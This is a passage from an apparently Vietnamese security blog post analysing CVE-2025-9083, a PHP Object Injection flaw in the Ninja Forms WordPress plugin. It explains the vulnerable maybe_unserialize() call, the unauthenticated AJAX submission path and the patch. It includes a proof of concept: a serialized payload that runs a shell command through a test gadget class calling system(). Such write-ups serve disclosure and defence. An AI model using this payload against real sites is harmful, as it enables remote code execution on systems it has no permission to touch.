noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Ninja Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ hàm &lt;code&gt;extractSubmissions()&lt;/code&gt; thuộc file &lt;code&gt;FieldsetRepeater.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(is_string($fieldSubmissionValue)){&#xA;    $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; được gọi nhưng không có cơ chế chống lại tấn công PHP Object Injection&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#34; title=&#34;Bản lỗi và bản vá&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Bản lỗi và bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#39; alt=&#34;Diff&#34; height=&#34;148&#34; width=&#34;1891&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản lỗi và bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã sử dụng &lt;code&gt;unserialize()&lt;/code&gt; thay vì &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Chặn toàn bộ việc tạo object khi unserialize bằng &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt; =&amp;gt; Ngăn chặn PHP Object Injection&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#34; title=&#34;Tên của class&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/class_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Class Name&lt;/h2&gt;&lt;p&gt;Tên của class&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#39; alt=&#34;Class Name&#34; height=&#34;335&#34; width=&#34;1117&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tên của class&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tên class tương ứng với một layout fields trong khi tạo blank form bằng plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#34; title=&#34;Tạo form với Repeatable Fieldset&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Tạo form với Repeatable Fieldset&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;782&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo form với Repeatable Fieldset&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thử tạo form với &lt;strong&gt;Repeatable Fieldset&lt;/strong&gt; sau đó kéo &lt;strong&gt;Single Line Text&lt;/strong&gt; vào &lt;strong&gt;Repeatable Fieldset&lt;/strong&gt; để làm input, embed nó vào post hoặc page&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; title=&#34;Thêm form vào post&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed Form&lt;/h2&gt;&lt;p&gt;Thêm form vào post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#39; alt=&#34;Embed Form&#34; height=&#34;455&#34; width=&#34;1192&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thêm form vào post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Public post và thử submit form với input là &lt;code&gt;payload&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#34; title=&#34;Request thử với `payload`&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/request1.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request thử với `payload`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#39; alt=&#34;Request&#34; height=&#34;967&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request thử với `payload`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy toàn bộ dữ liệu được gán vào param &lt;code&gt;formData&lt;/code&gt;, ta copy nội dung đã được URL Decode vào ứng dụng format JSON online &lt;a href=&#34;https://jsonformatter.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://jsonformatter.org/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#34; title=&#34;Data dạng JSON được format&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/format.png&#34; data-sub-html=&#34;&lt;h2&gt;Format&lt;/h2&gt;&lt;p&gt;Data dạng JSON được format&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#39; alt=&#34;Format&#34; height=&#34;834&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Data dạng JSON được format&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan sát debugger ta thấy sự tương đồng ở đây&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#34; title=&#34;Dữ liệu trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Dữ liệu trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;331&#34; width=&#34;1596&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Dữ liệu trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$fieldSubmissionValue&lt;/code&gt; tương ứng với &lt;code&gt;value&lt;/code&gt; trong field có id &lt;code&gt;8&lt;/code&gt;. Như vậy khi &lt;code&gt;value&lt;/code&gt; là chuỗi thì nó sẽ gọi hàm &lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta tạo class và đặt trong &lt;code&gt;wp-config.php&lt;/code&gt; để test sự kiện kích hoạt khi &lt;code&gt;maybe_unserialize()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;   public $command;&#xA;&#xA;   function __destruct(){&#xA;&#x9;&#x9;die(system($this-&amp;gt;command));&#xA;   }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gửi lại request submit với giá trị của &lt;code&gt;value&lt;/code&gt; là chuỗi serialize chứa payload. Vì bao bọc bên ngoài là JSON nên khi truyền chuỗi cần phải chú ý escape &lt;code&gt;&amp;quot;&lt;/code&gt; thành &lt;code&gt;\&amp;quot;&lt;/code&gt; để tránh gây lỗi.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#34; title=&#34;Change giá trị của value thành chuỗi serialize&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/change_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Change Value&lt;/h2&gt;&lt;p&gt;Change giá trị của value thành chuỗi serialize&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#39; alt=&#34;Change Value&#34; height=&#34;843&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Change giá trị của value thành chuỗi serialize&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#34; title=&#34;Giá trị của value trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug2.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug2&lt;/h2&gt;&lt;p&gt;Giá trị của value trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#39; alt=&#34;Debug2&#34; height=&#34;305&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của value trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Shell thực thi =&amp;gt; Deserialize được kích hoạt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#34; title=&#34;Deserialize được kích hoạt&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Deserialize được kích hoạt&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#39; alt=&#34;Result&#34; height=&#34;836&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Deserialize được kích hoạt&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Luồng gọi hàm của callstack:&lt;/p&gt;&#xA;&lt;p&gt;Ứng dụng đã đăng ký một ajax dành cho Unauthenticated user&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if( isset( $_POST[&amp;#39;formData&amp;#39;] ) ) {&#xA;    $this-&amp;gt;_form_data = json_decode( $_POST[&amp;#39;formData&amp;#39;], TRUE  );&#xA;&#xA;    // php5.2 fallback&#xA;    if( ! $this-&amp;gt;_form_data ) $this-&amp;gt;_form_data = json_decode( stripslashes( $_POST[&amp;#39;formData&amp;#39;] ), TRUE  );&#xA;}&#xA;add_action( &amp;#39;wp_ajax_nopriv_nf_ajax_submit&amp;#39;,   array( $this, &amp;#39;submit&amp;#39; )  );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức khi gửi POST request đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=nf_ajax_submit&lt;/code&gt; thì callback &lt;code&gt;submit&lt;/code&gt; được gọi&lt;/p&gt;&#xA;&lt;p&gt;Khi form được submit đầy đủ thì nó luồng gọi hàm sẽ theo trình tự này&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#34; title=&#34;Luồng gọi hàm trong callstack&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/callstack.png&#34; data-sub-html=&#34;&lt;h2&gt;Callstack&lt;/h2&gt;&lt;p&gt;Luồng gọi hàm trong callstack&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#39; alt=&#34;Callstack&#34; height=&#34;247&#34; width=&#34;682&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Luồng gọi hàm trong callstack&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;] -- action=nf_ajax_submit&amp;amp;security=security_code&amp;amp;formData=form_data --&amp;gt; B[&amp;#34;wp_ajax_nopriv_nf_ajax_submit&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;NF_AJAX_Controllers_Submission::submit()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;NF_AJAX_Controllers_Submission::process()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;NF_MergeTags_Fields::add_field()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;NF_MergeTags_Fields::generateFieldsetTableRows()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;NF_Handlers_FieldsetRepeater::extractSubmissions()&amp;#34;] --&amp;gt; H{$fieldSubmissionValue is String?}&#xA;H -- Yes --&amp;gt; I[&amp;#34;maybe_unserialize($fieldSubmissionValue)&amp;#34;]&#xA;I --&amp;gt; K(&amp;#34;RCE&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Sử dụng plugin để tạo blank form với &lt;code&gt;Single Line Text&lt;/code&gt; nằm trong &lt;code&gt;Repeatable Fieldset&lt;/code&gt; và thêm form vào post/page&lt;/li&gt;&#xA;&lt;li&gt;Submit form và cho request đi qua Burp proxy&lt;/li&gt;&#xA;&lt;li&gt;Sửa lại &lt;code&gt;value&lt;/code&gt; của &lt;code&gt;field&lt;/code&gt; chứa chuổi serialized thay thì JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;O:15:\&amp;#34;ObjectInjection\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:4:\&amp;#34;ls /\&amp;#34;;}&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gửi lại request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Để test trên local, ta tạo class chứa magic method &lt;code&gt;__wakeup()&lt;/code&gt; sẽ tự kích hoạt khi deserialized đặt nó trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Lỗ hổng CVE-2025-9083 bắt nguồn từ việc sử dụng &lt;code&gt;maybe_unserialize()&lt;/code&gt; trên dữ liệu do người dùng cung cấp mà không có bất kỳ cơ chế kiểm soát hoặc hạn chế lớp được unserialize. Điều này cho phép kẻ tấn công chưa xác thực thực thi mã tuỳ ý trên hệ thống nếu tìm được gadget phù hợp trong WordPress hoặc plugin/theme khác. Bản vá 3.11.1 đã loại bỏ hoàn toàn khả năng tạo object bằng cách sử dụng &lt;code&gt;unserialize()&lt;/code&gt; với tùy chọn &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt;, giúp ngăn chặn POI ở tầng cơ sở.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; cực kỳ rủi ro khi áp dụng lên input của người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cần một gadget tồn tại trong mã nguồn là có thể dẫn đến Remote Code Execution.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX endpoints mở cho unauthenticated user thường là điểm tấn công trọng yếu.&lt;/li&gt;&#xA;&lt;li&gt;JSON embedding khiến payload serialize phải escape cẩn thận để tránh lỗi.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá 3.11.1 chứng minh việc kiểm soát lớp khi unserialize là biện pháp phòng thủ quan trọng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  